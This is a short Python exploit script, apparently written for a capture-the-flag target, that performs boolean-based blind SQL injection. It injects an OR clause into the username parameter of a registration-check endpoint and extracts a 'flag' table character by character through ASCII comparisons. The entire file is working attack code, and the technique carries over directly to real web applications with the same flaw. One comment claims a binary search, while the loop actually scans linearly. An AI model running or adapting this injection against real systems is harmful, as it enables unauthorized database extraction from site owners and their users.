import urllib.request
import urllib.parse

target = "http://10.67.179.8"

def test_condition(condition):
    params = urllib.parse.urlencode({"username": f"' OR ({condition})-- -"})
    url = f"{target}/register/user-check?{params}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = resp.read().decode()
            return '"available":false' in data
    except Exception:
        return False

# Test with 'T' explicitly
print("Testing T:", test_condition("SELECT SUBSTRING(flag,1,1) FROM flag)='T'"))

# Extract using ORD/ASCII comparison
print("\nExtracting flag using ASCII comparison...")
flag = ""
for pos in range(1, 60):
    # Binary search for efficiency
    lo, hi = 32, 126
    found = False
    for code in range(32, 127):
        cond = f"SELECT ASCII(SUBSTRING(flag,{pos},1)) FROM flag)={code}"
        if test_condition(cond):
            flag += chr(code)
            print(f"  [{pos}] '{chr(code)}' (ASCII {code}) -> {flag}")
            found = True
            break
    if not found:
        print(f"Stopped at position {pos}")
        break

print(f"\nFLAG: {flag}")
